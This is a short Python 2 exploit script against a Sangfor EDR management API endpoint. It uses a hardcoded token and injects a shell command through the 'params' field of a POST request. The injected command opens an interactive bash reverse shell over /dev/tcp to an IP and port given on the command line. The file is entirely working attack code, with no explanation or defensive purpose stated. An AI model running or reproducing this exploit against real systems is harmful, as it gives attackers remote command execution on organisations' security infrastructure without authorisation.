import requests
import json
import sys

if len(sys.argv) < 2:
    print "Example: python exp.py url ip port"
    sys.exit()
url = sys.argv[1]
vuln_url = url+"/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9"

print ">>>Vuln Url=%s" % vuln_url
ip = sys.argv[2]
port = sys.argv[3]
data = {"params":"w=123\"'1234123'\"|bash -i > /dev/tcp/"+ip+"/"+port+" 0>&1"}
proxies = {"http":"http://127.0.0.1:8080"}
headers = {"Cache-Control": "max-age=0",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Sec-Fetch-Site": "none",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-User": "?1",
"Sec-Fetch-Dest": "document",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "zh-CN,zh;q=0.9",
"Content-Type": "application/x-www-form-urlencoded"}
re = requests.post(vuln_url,data = json.dumps(data),headers=headers, verify=False)#, proxies=proxies)
print re.text